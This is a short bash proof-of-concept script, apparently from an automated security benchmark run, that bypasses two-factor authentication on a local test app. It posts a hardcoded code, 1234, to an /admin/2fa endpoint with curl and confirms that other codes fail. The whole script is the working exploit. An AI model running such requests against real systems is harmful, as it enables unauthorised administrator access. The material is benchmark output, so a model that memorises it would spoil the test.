#!/bin/bash
# POC: Demonstrates 2FA bypass by submitting hardcoded code 1234 to /admin/2fa endpoint
# Target: ./repo
# Created: 2025-12-01T15:44:27.618Z
# Session: benchmark-XBEN-089-24-minbd498

# 2FA Hardcoded Code Bypass POC
# This script demonstrates a critical 2FA bypass vulnerability where
# code=1234 is hardcoded in the client-side JavaScript and accepted by the backend

TARGET_URL="http://localhost:5003"
ENDPOINT="/admin/2fa"

echo "[*] 2FA Hardcoded Code Bypass POC"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Step 1: Try to bypass with hardcoded code 1234
echo "[*] Step 1: Testing hardcoded code 1234 (should succeed)"
echo "[*] POST Request: code=1234"
response=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=1234")

echo "[*] Response: $response"
if echo "$response" | grep -q "success.*true"; then
  echo "[✓] VULNERABLE: Hardcoded code 1234 accepted as valid!"
else
  echo "[-] Response did not contain success: true"
fi
echo ""

# Step 2: Try with an invalid code to confirm validation is working
echo "[*] Step 2: Testing invalid code 9999 (should fail)"
echo "[*] POST Request: code=9999"
response2=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=9999")

echo "[*] Response: $response2"
if echo "$response2" | grep -q "success.*false"; then
  echo "[✓] Confirmed: Invalid codes are rejected, only 1234 works"
else
  echo "[-] Response did not indicate failure"
fi
echo ""

# Step 3: Try another valid-looking code to confirm hardcoded nature
echo "[*] Step 3: Testing another code 5555 (should fail)"
echo "[*] POST Request: code=5555"
response3=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=5555")

echo "[*] Response: $response3"
if echo "$response3" | grep -q "success.*false"; then
  echo "[✓] Confirmed: Only hardcoded code 1234 bypasses 2FA"
else
  echo "[-] Response did not indicate failure"
fi
echo ""

echo "[!] CONCLUSION: 2FA can be completely bypassed using hardcoded code 1234"